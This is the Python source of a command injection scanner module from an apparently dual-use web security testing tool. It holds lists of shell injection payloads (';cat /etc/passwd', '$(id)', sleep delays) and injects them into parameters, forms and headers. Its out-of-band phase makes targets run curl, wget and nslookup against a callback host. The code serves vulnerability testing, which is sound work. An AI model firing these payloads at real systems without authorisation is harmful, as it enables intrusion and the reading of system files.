"""
OS Command Injection Scanner — per-parameter isolation.

Uses InsertionPoint engine for systematic, isolated injection into every
parameter, POST field, cookie, and header independently.

Detection:
  - ErrorPatternMatcher.match_command_output() with baseline subtraction
  - TimingAnalyzer with 3 confirmation samples and Mann-Whitney U
  - ErrorPatternMatcher.match_command_errors() for shell error patterns
  - OOB blind CMDi via callback server
"""

import time
from urllib.parse import urlparse, parse_qs

from secprobe.config import Severity
from secprobe.core.detection import Confidence, ErrorPatternMatcher
from secprobe.core.exceptions import TargetUnreachableError, WAFBlockedError
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, InsertionPoint, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


# Output-based payloads
OUTPUT_PAYLOADS = [
    (";id", "Unix id"),
    ("|id", "Pipe id"),
    ("$(id)", "Sub-shell id"),
    ("`id`", "Backtick id"),
    (";cat /etc/passwd", "Read /etc/passwd"),
    ("|cat /etc/passwd", "Pipe /etc/passwd"),
    ("$(cat /etc/passwd)", "Sub-shell /etc/passwd"),
    (";uname -a", "Uname"),
    ("&whoami", "Windows whoami"),
    ("|type C:\\windows\\win.ini", "Windows win.ini"),
    ("\n id", "Newline id"),
    (";echo $((7*7))", "Math eval"),
    ("| ver", "Windows version"),
]

# Time-based payloads: (payload, expected_delay, description)
TIME_PAYLOADS = [
    (";sleep 3", 3.0, "Unix sleep"),
    ("|sleep 3", 3.0, "Pipe sleep"),
    ("$(sleep 3)", 3.0, "Sub-shell sleep"),
    ("`sleep 3`", 3.0, "Backtick sleep"),
    (";sleep 3 #", 3.0, "Sleep with comment"),
    ("|| sleep 3", 3.0, "OR sleep"),
    ("&& sleep 3", 3.0, "AND sleep"),
    ("& ping -n 4 127.0.0.1", 3.0, "Windows ping delay"),
    (";sleep 3;", 3.0, "Sleep semicolons"),
    ("\n sleep 3 \n", 3.0, "Newline sleep"),
]


class CMDiScanner(SmartScanner):
    name = "CMDi Scanner"
    description = "Test for OS Command Injection vulnerabilities"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing command injection on {url}", "progress")

        # -- Initialize detection engine
        engine = self._init_detection_engine()

        try:
            baseline = self.http_client.get(url)
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        baseline_text = baseline.text

        # Profile endpoint
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        engine.profile(url, params=params or None)

        # -- Discover ALL insertion points
        discovery = InsertionPointDiscovery(
            http_client=self.http_client,
            include_headers=True,
            include_cookies=True,
            include_paths=True,
        )

        # Gather test URLs
        test_urls = self._build_test_urls(url)
        if self.context:
            for u in self.context.get_injection_urls():
                if u not in test_urls:
                    test_urls.append(u)

        for injectable_url in self._get_injectable_urls():
            if injectable_url not in test_urls:
                test_urls.append(injectable_url)

        if not test_urls:
            test_urls = [
                f"{url}?cmd=test", f"{url}?exec=test",
                f"{url}?command=test", f"{url}?ping=test",
                f"{url}?ip=test", f"{url}?host=test",
            ]

        # Discover forms
        forms = self.context.get_injectable_forms() if self.context else []

        # Build insertion points
        all_points: list[InsertionPoint] = []
        for test_url in test_urls:
            points = discovery.discover(test_url, response=baseline, forms=forms)
            all_points.extend(points)

        # Separate by type
        param_points = [p for p in all_points if p.type in (
            InsertionType.QUERY_PARAM, InsertionType.PATH_SEGMENT)]
        form_points = [p for p in all_points if p.type == InsertionType.POST_PARAM]
        header_points = [p for p in all_points if p.type == InsertionType.HEADER]
        cookie_points = [p for p in all_points if p.type == InsertionType.COOKIE]

        total_points = len(all_points)
        print_status(
            f"Discovered {total_points} insertion points "
            f"({len(param_points)} params, {len(form_points)} forms, "
            f"{len(header_points)} headers, {len(cookie_points)} cookies)", "info"
        )

        found_vulns: set[tuple] = set()

        # ── Detect target technology ─────────────────────────────────
        baseline_tech = self.detect_technology(baseline_text)
        if baseline_tech:
            print_status(f"Technology detected: {', '.join(baseline_tech)}", "info")

        # -- Phase 1: Output-based detection (per-parameter isolation)
        print_status("Phase 1: Output-based command injection (per-parameter isolation)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, desc in OUTPUT_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                payload_variants = self._evade_payload(payload, vuln_type="cmdi")
                for p in payload_variants:
                    spec = point.inject(p, mode="append")
                    try:
                        resp = send_request(self.http_client, spec,
                                            allow_redirects=False, timeout=10)
                    except WAFBlockedError:
                        continue
                    except Exception:
                        continue

                    # Use ErrorPatternMatcher with baseline subtraction
                    cmd_output = ErrorPatternMatcher.match_command_output(
                        resp.text, baseline_text)
                    cmd_errors = ErrorPatternMatcher.match_command_errors(
                        resp.text, baseline_text)
                    file_matches = ErrorPatternMatcher.match_file_disclosure(
                        resp.text, baseline_text)

                    all_matches = cmd_output + cmd_errors + file_matches
                    if all_matches:
                        best = max(all_matches, key=lambda m: m.confidence)
                        if best.confidence >= Confidence.FIRM:
                            # ── SmartScanner verification ────────────
                            verification = self.verify_finding(
                                url=spec.url, param=point.name,
                                payload=payload, vuln_type="cmdi",
                            )
                            found_vulns.add(point_key)
                            if verification.confirmed:
                                self.add_verified_finding(
                                    title=f"Verified OS Command Injection - {desc}",
                                    severity=Severity.CRITICAL,
                                    description=(
                                        f"Command output VERIFIED (confidence: {verification.confidence.name}).\n"
                                        f"Injection point: {point.display_name}\n"
                                        f"Payload: {payload}\n"
                                        f"Evidence: {best.description}"
                                    ),
                                    confidence=verification.confidence,
                                    verification_evidence=verification.evidence,
                                    recommendation="Never pass user input to shell commands. Use language-native APIs.",
                                    category="Command Injection",
                                    url=spec.url,
                                    cwe="CWE-78",
                                )
                                print_finding(Severity.CRITICAL, f"Verified CMDi: {desc} via {point.name}")
                            else:
                                sev = Severity.CRITICAL if best.confidence >= Confidence.CONFIRMED else Severity.HIGH
                                self.add_finding(
                                    title=f"OS Command Injection - {desc}",
                                    severity=sev,
                                    description=(
                                        f"Command output detected (confidence: {best.confidence.name}).\n"
                                        f"Injection point: {point.display_name}\n"
                                        f"Payload: {payload}\n"
                                        f"Evidence: {best.description}"
                                    ),
                                    recommendation="Never pass user input to shell commands. Use language-native APIs.",
                                    evidence=(
                                        f"Parameter: {point.name} ({point.type.value})\n"
                                        f"URL: {spec.url}\n"
                                        f"Matched: {best.matched_text[:200]}"
                                    ),
                                    category="Command Injection",
                                    url=spec.url,
                                    cwe="CWE-78",
                                )
                                print_finding(sev, f"CMDi: {desc} via {point.name} ({best.confidence.name})")
                            break
                else:
                    continue
                break

        # -- Phase 2: Time-based blind detection (per-parameter)
        print_status("Phase 2: Time-based blind command injection (per-parameter)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, expected_delay, desc in TIME_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")

                result = engine.test_timing(
                    url=spec.url,
                    parameter=point.name,
                    payload=payload,
                    method="GET",
                    expected_delay=expected_delay,
                )

                if result.confidence >= Confidence.FIRM:
                    # ── SmartScanner timing verification ──────────
                    verification = self.verify_finding(
                        url=spec.url, param=point.name,
                        payload=payload, vuln_type="cmdi_timing",
                        delay_seconds=expected_delay,
                    )
                    found_vulns.add(point_key)
                    if verification.confirmed:
                        self.add_verified_finding(
                            title=f"Verified OS Command Injection (blind) - {desc}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Statistical timing VERIFIED injection "
                                f"(confidence: {verification.confidence.name}).\n"
                                f"Injection point: {point.display_name}\n"
                                f"{'; '.join(result.evidence)}"
                            ),
                            confidence=verification.confidence,
                            verification_evidence=verification.evidence,
                            recommendation="Never pass user input to shell commands.",
                            category="Command Injection",
                            url=spec.url,
                            cwe="CWE-78",
                        )
                        print_finding(Severity.CRITICAL, f"Verified Blind CMDi: {desc} via {point.name}")
                    else:
                        sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                        self.add_finding(
                            title=f"OS Command Injection (blind) - {desc}",
                            severity=sev,
                            description=(
                                f"Statistical timing confirms injection "
                                f"(confidence: {result.confidence.name}).\n"
                                f"Injection point: {point.display_name}\n"
                                f"{'; '.join(result.evidence)}"
                            ),
                            recommendation="Never pass user input to shell commands.",
                            evidence=(
                                f"Parameter: {point.name} ({point.type.value})\n"
                                f"URL: {spec.url}\n"
                                f"Timing: {result.score_breakdown}"
                            ),
                            category="Command Injection",
                            url=spec.url,
                            cwe="CWE-78",
                        )
                        print_finding(sev, f"Blind CMDi: {desc} via {point.name} ({result.confidence.name})")
                    break

        # -- Phase 3: POST form CMDi (per-field isolation)
        print_status("Phase 3: POST form command injection (per-field isolation)", "progress")
        for point in form_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, desc in OUTPUT_PAYLOADS[:6]:
                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                matches = (
                    ErrorPatternMatcher.match_command_output(resp.text, baseline_text) +
                    ErrorPatternMatcher.match_command_errors(resp.text, baseline_text)
                )
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        found_vulns.add(point_key)
                        self.add_finding(
                            title=f"OS Command Injection (POST) - {desc} via '{point.name}'",
                            severity=Severity.CRITICAL,
                            description=(
                                f"POST CMDi at {point.base_url} (confidence: {best.confidence.name})\n"
                                f"Injection point: {point.display_name}"
                            ),
                            recommendation="Never pass user input to shell commands.",
                            evidence=f"Field: {point.name}\nPayload: {payload}\nMatch: {best.matched_text[:100]}",
                            category="Command Injection",
                            url=point.base_url,
                            cwe="CWE-78",
                        )
                        break

        # -- Phase 4: Header-based CMDi (per-header isolation)
        print_status("Phase 4: Header-based command injection (per-header isolation)", "progress")
        for point in header_points:
            point_key = ("header", point.name)
            if point_key in found_vulns:
                continue

            # Only test a few high-value headers for CMDi
            if point.name not in ("Referer", "User-Agent", "X-Forwarded-For",
                                  "X-Original-URL", "X-Rewrite-URL"):
                continue

            for payload, desc in OUTPUT_PAYLOADS[:4]:
                spec = point.inject(f"test{payload}", mode="replace")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                matches = (
                    ErrorPatternMatcher.match_command_output(resp.text, baseline_text) +
                    ErrorPatternMatcher.match_command_errors(resp.text, baseline_text)
                )
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        found_vulns.add(point_key)
                        self.add_finding(
                            title=f"OS Command Injection (Header) - {point.name}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"CMDi via {point.name} header ({best.confidence.name})\n"
                                f"Injection point: {point.display_name}"
                            ),
                            recommendation="Never use HTTP headers in system commands.",
                            evidence=f"Header: {point.name}\nPayload: {payload}",
                            category="Command Injection",
                            url=url,
                            cwe="CWE-78",
                        )
                        break

        # -- Phase 5: OOB blind CMDi (per-parameter)
        if self.oob_available:
            print_status("Phase 5: OOB blind command injection (per-parameter)", "progress")
            oob_count = 0
            for point in param_points[:5]:
                point_key = (point.base_url.split("?")[0], point.name)
                if point_key in found_vulns:
                    continue

                # curl callback
                token = self.oob_generate_token(point.base_url, point.name, "rce_blind", "curl")
                cb_url = self.oob_get_url(token)
                for sep in [";", "|", "$(", "`"]:
                    close = ")" if sep == "$(" else "`" if sep == "`" else ""
                    p = f"{sep}curl {cb_url}{close}"
                    spec = point.inject(p, mode="append")
                    try:
                        send_request(self.http_client, spec, allow_redirects=False, timeout=10)
                        oob_count += 1
                    except Exception:
                        pass

                # wget callback
                token = self.oob_generate_token(point.base_url, point.name, "rce_blind", "wget")
                cb_url = self.oob_get_url(token)
                spec = point.inject(f";wget -q {cb_url}", mode="append")
                try:
                    send_request(self.http_client, spec, allow_redirects=False, timeout=10)
                    oob_count += 1
                except Exception:
                    pass

                # nslookup (DNS exfil)
                token = self.oob_generate_token(point.base_url, point.name, "rce_blind", "nslookup")
                cb_domain = self.oob_get_domain(token)
                spec = point.inject(f";nslookup {cb_domain}", mode="append")
                try:
                    send_request(self.http_client, spec, allow_redirects=False, timeout=10)
                    oob_count += 1
                except Exception:
                    pass

            if oob_count:
                print_status(f"Sent {oob_count} OOB CMDi payloads, waiting...", "progress")
                self.oob_collect_findings(wait_seconds=10)

        # -- Summary
        if not found_vulns:
            print_status("No command injection vulnerabilities detected.", "success")
            self.add_finding(
                title="No command injection detected",
                severity=Severity.INFO,
                description=(
                    f"Automated tests did not detect OS command injection.\n"
                    f"Insertion points tested: {total_points}"
                ),
                category="Command Injection",
            )

    def _get_injectable_urls(self) -> list[str]:
        """Get all injectable URLs from attack surface + root target."""
        urls = set()
        if self.context and hasattr(self.context, 'attack_surface') and self.context.attack_surface:
            for ep in self.context.attack_surface.endpoints:
                if ep.params:
                    param_str = "&".join(f"{k}={v}" for k, v in ep.params.items())
                    urls.add(f"{ep.url}?{param_str}" if param_str else ep.url)
                else:
                    urls.add(ep.url)
            if hasattr(self.context, 'get_injection_urls'):
                try:
                    urls.update(self.context.get_injection_urls())
                except Exception:
                    pass
        urls.add(self.config.target)
        return list(urls)

    def _build_test_urls(self, url):
        parsed = urlparse(url)
        if parsed.query:
            return [url]
        return []
